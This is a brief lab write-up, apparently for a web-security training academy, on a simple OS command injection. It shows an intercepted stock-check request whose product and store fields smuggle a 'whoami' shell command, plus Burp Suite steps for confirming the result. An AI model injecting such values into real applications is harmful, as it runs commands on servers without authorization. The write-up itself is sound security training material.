# OS Command Injection | Simple Case

```jsx
POST /product/stock HTTP/2
Host: 0a83002a04c617b080bef530006200f7.web-security-academy.net
Cookie: session=wbtN4Xe595O0WEvKgjnzTyo8Z8jqR8ZI
Content-Length: 21
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a83002a04c617b080bef530006200f7.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a83002a04c617b080bef530006200f7.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

productId=2;**whoami**&storeId=1
```

1. Use Burp Suite to intercept and modify a request that checks the stock level.
2. Modify the `storeID` parameter, giving it the value `1|whoami`.
3. Observe that the response contains the name of the current user.

![image.png](OS%20Command%20Injection%20Simple%20Case/image.png)

![image.png](OS%20Command%20Injection%20Simple%20Case/image%201.png)

![image.png](OS%20Command%20Injection%20Simple%20Case/image%202.png)

![image.png](OS%20Command%20Injection%20Simple%20Case/image%203.png)

![image.png](OS%20Command%20Injection%20Simple%20Case/image%204.png)